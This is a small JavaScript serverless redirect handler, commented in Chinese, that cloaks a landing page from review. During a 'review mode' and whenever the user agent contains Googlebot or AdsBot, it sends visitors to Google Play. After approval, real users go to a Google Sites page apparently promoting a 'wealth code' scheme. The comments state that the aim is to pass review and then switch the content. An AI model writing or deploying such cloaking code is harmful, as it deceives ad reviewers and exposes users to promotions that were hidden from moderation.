// api/redirect.js
module.exports = (req, res) => {
    // ============ 审核模式配置 ============
    // 过审前设为 true，过审后改为 false
    const IS_REVIEW_MODE = true;
    
    const REVIEW_PAGE = 'https://play.google.com';
    const MY_LANDING_PAGE = 'https://sites.google.com/view/caifumima-bitepiae/%E9%A6%96%E9%A1%B5?authuser=2';

    // 1. 审核模式：所有请求都跳转到 google.com
    if (IS_REVIEW_MODE) {
        return res.redirect(302, REVIEW_PAGE);
    }

    // ============ 以下代码仅在审核通过后执行 ============
    // 2. 判断是否为谷歌爬虫
    const userAgent = req.headers['user-agent'] || '';
    const isGoogleBot = userAgent.includes('Googlebot') || userAgent.includes('AdsBot');
    
    if (isGoogleBot) {
        return res.redirect(302, REVIEW_PAGE);
    }

    // 3. 默认：真实用户跳转到你的落地页
    return res.redirect(302, MY_LANDING_PAGE);
};
